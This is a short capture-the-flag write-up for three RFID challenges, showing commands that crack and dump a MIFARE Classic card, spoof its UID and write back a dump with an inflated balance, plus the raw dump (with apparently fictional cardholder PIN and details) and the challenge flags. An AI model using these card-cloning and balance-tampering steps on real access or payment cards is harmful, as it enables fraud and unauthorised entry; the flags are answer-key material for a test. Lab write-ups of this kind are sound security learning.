---
ai_date: '2025-04-27 05:25:14'
ai_summary: Exploited cleartext RFID data and UID spoofing to gain access, manipulated
  balance for flag
ai_tags:
- rfid
- uid-spoofing
- balance-manipulation
created: 2025-03-01T18:34
points: 1500
solves: 13
updated: 2025-03-18T02:28
---

Fun first time RFID challenge!
## RFID 1 - Cleartext

```bash
mfoc -O carddump.mdf
```

```
�X�bcdefghi��������i������QVRIQUNLQ1RGezBrTjB3SDRja1RoM0FUTSEhfQ==��������i��������������i��������������i��������������i��������������i��������������i��������������i��������������i��������������i������FIRSTNAME:ROGERLASTNAME:???BALANCE:0015$80c��������i������POSTCODE:H3G1M8PINCODE:6372BIRTH:30/06/1998��������i��������������i��������������i��������������i��������������i������
```

```flag
ATHACKCTF{0kN0wH4ckTh3ATM!!}
```

## RFID 2 - UIDentity Crisis

I renamed myself to Roger but couldn't get anything new out of the ATM machine.

---

Turns out admin forgot to include an image.

```bash
nfc-mfsetuid deadbeef
```

```flag
ATHACKCTF{Sp00fingUIDz}
```

## RFID 3 - Pay2Win

By editing the amount of money we have to 9900+, we can go to the ATM and buy a flag.

To write the new info to card, use this.

```bash
nfc-mfclassic w b carddump1.new.mdf carddump1.mdf f
```

```flag
ATHACKCTF{printf('$money$');}
```